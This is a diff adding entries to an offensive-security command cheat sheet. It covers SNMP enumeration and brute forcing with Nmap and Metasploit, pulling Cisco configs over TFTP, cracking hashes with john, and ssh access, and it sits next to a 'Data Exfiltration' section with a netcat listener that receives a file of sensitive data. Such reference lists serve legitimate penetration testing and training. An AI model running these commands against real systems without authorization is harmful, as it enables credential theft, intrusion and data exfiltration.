@@ -6,6 +6,26 @@ A searchable command reference for cybersecurity operations, threat hunting, inc
 
 # Command Index
 
+## Nmap (SNMP)  
+
+snmp enumeration | nmap -sU -p 161 --script snmp-info <target>  
+snmp brute force | nmap -sU -p 161 --script snmp-brute <target>  
+snmp config pull | sudo nmap -sU -p 161 --script snmp-ios-config --script-args creds.snmp=:<community> <target>  
+
+## Metasploit (SNMP)  
+
+start metasploit | msfconsole  
+snmp enumeration | use auxiliary/scanner/snmp/snmp_enum; set RHOSTS <target>; run  
+snmp brute force | use auxiliary/scanner/snmp/snmp_login; set RHOSTS <target>; run  
+snmp config via tftp | use auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS <target>; set COMMUNITY <community>; set OUTPUTDIR /tmp; run  
+
+## Credential / Access  
+
+crack hashes | john passwords.txt  
+show cracked | john --show passwords.txt  
+ssh access | ssh user@target 
+
+
 ## Data Exfiltration
 
 netcat listener (receive file) | nc -lvnp 10000 > sensitive_data.csv  
